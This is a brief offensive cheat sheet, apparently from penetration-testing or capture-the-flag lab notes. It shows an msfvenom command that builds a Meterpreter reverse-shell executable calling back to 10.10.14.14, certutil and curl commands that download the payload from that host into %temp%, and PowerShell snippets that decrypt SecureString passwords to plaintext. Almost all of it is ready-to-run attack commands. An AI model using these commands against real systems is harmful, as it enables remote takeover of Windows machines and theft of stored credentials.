
msfvenom command to generate reverse shell with meterpreter :
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=5555 -f exe -o s.exe
```


Downloads a file into `%temp%`
```shell
certutil -urlcache -f http://10.10.14.14:6666/s.exe %temp%/s.exe
curl http://10.10.14.14:8000/s.exe -o %temp%/s.exe
```


Decypher Secure String password :
```powershell
# Method 1 
$Decrypted = [System.Runtime.InteropServices.marshal]::PtrToStringAuto([System.Runtime.InteropServices.marshal]::SecureStringToBSTR($InputSecureString)) 
# Method 2 
$temp = New-Object PSCredential ("Decrypt", $InputSecureString) 
$Decrypted = $temp.GetNetworkCredential().Password
```